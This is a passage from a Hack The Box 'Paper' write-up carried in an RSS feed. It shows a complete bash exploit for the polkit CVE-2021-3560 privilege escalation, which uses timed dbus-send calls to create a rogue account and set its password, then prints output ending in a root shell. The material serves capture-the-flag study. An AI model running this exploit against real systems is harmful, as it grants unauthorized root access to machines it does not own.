font-style: inherit;">[dwight@paper</span> shm]$ cat root.sh </span>
<span id="cb11-2"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#!/bin/bash</span></span>
<span id="cb11-3"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"    - CVE-2021-3560 Exploit - "</span></span>
<span id="cb11-4"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" - Run script until it succeed -"</span></span>
<span id="cb11-5"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> i <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">..</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">50</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">do</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dbus-send</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--system</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dest</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>org.freedesktop.Accounts <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>method_call <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--print-reply</span> /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sleep</span> 0.003s <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">kill</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$!</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">done</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /dev/null <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&amp;</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span></span>
<span id="cb11-6"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"[+] Created account"</span></span>
<span id="cb11-7"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> i <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">..</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">50</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">do</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dbus-send</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--system</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dest</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>org.freedesktop.Accounts <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>method_call <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--print-reply</span> /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string: string:GoldenEye <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sleep</span> 0.003s <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&amp;</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">kill</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$!</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">done</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /dev/null <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&amp;</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span></span>
<span id="cb11-8"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"[+] Set blank password (blank)"</span></span>
<span id="cb11-9"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"[+] Elevating to root.."</span></span>
<span id="cb11-10"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">su</span> playerthree <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'sudo su'</span></span></code></pre></div>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[dwight@paper</span> shm]$ ./root.sh </span>
<span id="cb12-2">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> CVE-2021-3560 Exploit <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> </span>
<span id="cb12-3"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> Run script until it succeed <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb12-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Created account</span>
<span id="cb12-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Set blank password <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">blank</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb12-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Elevating to root..</span>
<span id="cb12-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> cannot set terminal process group <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">583183</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Inappropriate ioctl for device</span>
<span id="cb12-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> no job control in this shell</span>
<span id="cb12-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[root@paper</span> shm]# id</span>
<span id="cb12-10"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="references" class="level1">
<h1>References</h1>
<ul>
<li><a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">Polkit Privesc - CVE-2021-3560</a></li>
</ul>


</section>

 ]]></description>
  <category>hackthebox</category>
  <category>easy</category>
  <category>linux</category>
  <category>wordpress</category>
  <category>rocket.chat</category>
  <category>polkit</category>
  <category>cve-2021-3560</category>
  <guid>https://exploit.se/posts/2022-02-16-htb-writeup-paper/2022-02-16-htb-writeup-paper.html</guid>
  <pubDate>Wed, 16 Feb 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-02-16-htb-writeup-paper/images/paper_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
</channel>
</rss>
